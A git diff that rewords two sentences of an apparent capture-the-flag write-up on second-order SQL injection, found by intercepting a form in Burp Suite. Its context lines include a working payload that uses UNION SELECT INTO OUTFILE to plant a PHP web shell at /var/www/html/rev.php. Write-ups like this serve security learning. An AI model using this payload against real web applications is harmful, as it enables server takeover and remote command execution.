@@ -106,7 +106,7 @@ It seems that this website and database are vulnerable to something known as a s
 
 We open up **burpsuite** in order to intercept the form.
 
-It seems that when we supply a country and username to the form on the website we see that in burpsuite intercept it looks like:
+It seems that when we supply a country and username to the form on the website, we see in burpsuite intercept it looks like:
 
 ```
 username=test&country=Brazil
@@ -125,7 +125,7 @@ Fatal error: Uncaught Error: Call to a member function fetch_assoc() on bool in
 ```
 This shows that the site is taking our user-supplied data and then incorporating it into the account.php query, a "Second-order SQL injection". 
 
-So it is possible to write a file into the `/var/www/html` directory, which means we can place a simple php web shell in our burpsuite request with SQL commands: 
+So it is possible to write a file into the `/var/www/html` directory, which means we can place a simple php web shell onto the box by way of our burpsuite request with SQL commands: 
 
 ```
 username=test&country=Brazil' union select "<?php SYSTEM($_REQUEST['cmd']); ?>" into outfile '/var/www/html/rev.php'-- -
